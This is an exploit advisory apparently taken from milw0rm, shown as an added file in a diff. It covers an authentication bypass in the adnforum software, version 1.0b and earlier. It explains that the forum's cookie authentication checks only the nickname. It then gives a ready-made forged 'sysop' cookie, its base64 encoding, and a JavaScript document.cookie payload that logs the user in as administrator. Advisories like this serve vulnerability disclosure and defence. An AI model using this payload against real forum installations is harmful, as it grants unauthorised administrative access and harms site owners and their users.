@@ -1,0 +1,30 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+adnforum <= 1.0b / Insecure Cookie Handling Vulnerability 
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+$ Program: adnforum
+$ Version: <= 1.0b
+$ File affected: index.php
+$ Download: http://sourceforge.net/projects/adnforum/
+
+
+Found by Pepelux <pepelux[at]enye-sec.org>
+eNYe-Sec - www.enye-sec.org
+
+
+Cookie is base64 based and the ascii format used is:
+user:23ed4e45887ad4311ff654bd4aab6540:user:0
+user:md5 pass:user:0
+
+Programmer forgot to check the pass and only use the nick to autenticate
+the user.
+
+You can create a fake cookie likes this:
+sysop:000000000000000000000000000000:sysop:0
+
+In base64: c3lzb3A6MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwOnN5c29wOjA
+
+Exploit:
+javascript:document.cookie = "fpusuario=c3lzb3A6MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwOnN5c29wOjA"
+
+# milw0rm.com [2008-09-24]
